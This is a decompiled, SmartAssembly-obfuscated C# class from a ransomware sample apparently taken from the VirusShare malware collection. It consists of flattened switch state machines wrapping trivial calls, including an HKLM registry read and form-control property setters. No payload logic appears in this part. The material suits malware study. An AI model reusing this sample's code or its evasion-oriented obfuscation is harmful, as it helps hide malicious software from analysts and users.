// Decompiled with JetBrains decompiler
// Type: Ⴈ.Ⴓ
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.Win32;
using SmartAssembly.SmartExceptionsCore;
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Ⴈ
{
  internal sealed class Ⴓ
  {
    public static string Ⴍ()
    {
      int num1;
      RegistryKey registryKey;
      string str1;
      string str2;
      int num2;
      string str3;
      try
      {
        try
        {
          try
          {
            num1 = 9;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  num1 = registryKey != null ? 2 : 1;
                  continue;
                case 1:
                  goto label_6;
                case 2:
                case 6:
                  str2 = (string) DoNotPruneTypeAttribute.Ⴃ(registryKey, ႷႭ.ႥႳ(1491049028, 2), (object) null, 914, 938);
                  num1 = 3;
                  continue;
                case 3:
                  goto label_8;
                case 4:
                  goto label_9;
                case 5:
                  registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, Ⴈ.Ⴀ.\u0002(), 563, 606);
                  num1 = 0;
                  continue;
                case 8:
                  num1 = registryKey != null ? 0 : 5;
                  continue;
                default:
                  registryKey = SmartAssembly.SmartExceptionsCore.DoNotObfuscateAttribute.Ⴍ(Registry.LocalMachine, Ⴈ.Ⴀ.\u0001(), 122, 23);
                  goto case 8;
              }
            }
label_6:
            str1 = (string) null;
            goto label_11;
label_8:
            SmartAssembly.SmartUsageCore.DoNotObfuscateAttribute.Ⴍ(registryKey, 160, 252);
label_9:
            str1 = str2;
          }
          catch
          {
            str1 = (string) null;
          }
label_11:
          num2 = 0;
          switch (num2)
          {
            case 4:
              break;
            default:
              str3 = str1;
              break;
          }
        }
        catch (Exception ex)
        {
          RegistryKey o1 = registryKey;
          string o2 = str2;
          string o3 = str1;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
          throw;
        }
        switch (2)
        {
          default:
            return str3;
        }
      }
      catch (Exception ex)
      {
        RegistryKey o1 = registryKey;
        string o2 = str2;
        string o3 = str1;
        string o4 = str3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) num2;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o7 = (ValueType) num3;
        StackFrameHelper.CreateException7(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) o7);
        throw;
      }
    }

    static Ⴓ()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static void Ⴗ([In] Label obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 5;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 5;
              continue;
            case 2:
              goto label_8;
            case 3:
            case 4:
              goto label_7;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 50:
                  num2 = 3;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.TabStop = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Label o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static int Ⴓ([In] ref DateTime obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 111:
            num2 = 8;
            break;
          case 112:
            num2 = 1;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 6:
              goto label_10;
            case 2:
              num1 = 3;
              continue;
            case 3:
              goto label_3;
            case 4:
            case 7:
            case 8:
              goto label_9;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴓ);
              num1 = 3;
              continue;
          }
        }
label_9:
        return obj0.Year;
label_10:
        return obj0.Second;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<DateTime> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static int Ⴃ([In] ref System.Drawing.Color obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 125:
            num2 = 3;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
            case 7:
              num1 = 4;
              continue;
            case 1:
            case 4:
              goto label_3;
            case 2:
              num1 = 4;
              continue;
            case 3:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴃ);
              num1 = 4;
              continue;
          }
        }
label_8:
        return obj0.ToArgb();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<System.Drawing.Color> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static AppDomain Ⴐ([In] int obj0, [In] int obj1)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj1 ^ obj0)
        {
          case 31:
            num2 = 5;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
              num1 = 7;
              continue;
            case 1:
            case 7:
              goto label_3;
            case 3:
              num1 = 7;
              continue;
            case 5:
              goto label_8;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴐ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return AppDomain.CurrentDomain;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) o2, (object) o3);
        throw;
      }
    }

    internal static void Ⴀ([In] Control obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_7;
            case 1:
              goto label_8;
            case 3:
            case 4:
              num1 = 2;
              continue;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 79:
                  num2 = 0;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Height = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Control o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static object Ⴅ([In] UnhandledExceptionEventArgs obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 46:
            num2 = 0;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 4:
            case 5:
              goto label_8;
            case 1:
            case 2:
              num1 = 7;
              continue;
            case 3:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴅ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return obj0.ExceptionObject;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        UnhandledExceptionEventArgs o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static object Ⴄ([In] Array obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj3 ^ obj2)
        {
          case 102:
            num2 = 1;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_3;
            case 1:
            case 2:
              goto label_8;
            case 3:
            case 6:
            case 7:
              num1 = 0;
              continue;
            case 4:
              num1 = 0;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴈ.Ⴓ.Ⴄ);
              num1 = 0;
              continue;
          }
        }
label_8:
        return obj0.GetValue(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        Array o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
        throw;
      }
    }
  }
}
